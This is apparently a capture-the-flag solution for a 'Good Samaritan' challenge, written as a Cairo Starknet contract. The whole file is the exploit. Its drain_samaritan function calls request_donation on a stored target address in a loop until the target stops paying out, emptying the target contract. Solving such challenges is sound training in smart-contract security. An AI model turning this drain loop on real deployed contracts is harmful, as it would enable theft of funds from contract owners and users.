#[starknet::interface]
trait IGoodSamaritanExploit<TContractState> {
    fn drain_samaritan(ref self: TContractState);
}

#[starknet::interface]
trait IGoodSamaritan<TContractState> {
    fn isComplete(self: @TContractState) -> bool;
    fn request_donation(self: @TContractState) -> bool;
}


#[starknet::contract]
mod GoodSamaritanExploit {
    use good_samaritan::good_samaritan_exploit::IGoodSamaritanDispatcherTrait;
    use starknet::ContractAddress;
    use super::IGoodSamaritanDispatcher;

    #[storage]
    struct Storage {
        good_samaritan: ContractAddress
    }

    #[constructor]
    fn constructor(ref self: ContractState, _good_samaritan: ContractAddress) {
        self.good_samaritan.write(_good_samaritan);
    }

    #[abi(embed_v0)]
    impl GoodSamaritanExploit of super::IGoodSamaritanExploit<ContractState> {
        fn drain_samaritan(ref self: ContractState) {
            let mut is_running: bool = true;
            while is_running {
                is_running =
                    IGoodSamaritanDispatcher { contract_address: self.good_samaritan.read() }
                    .request_donation();
            };
        }
    }
}
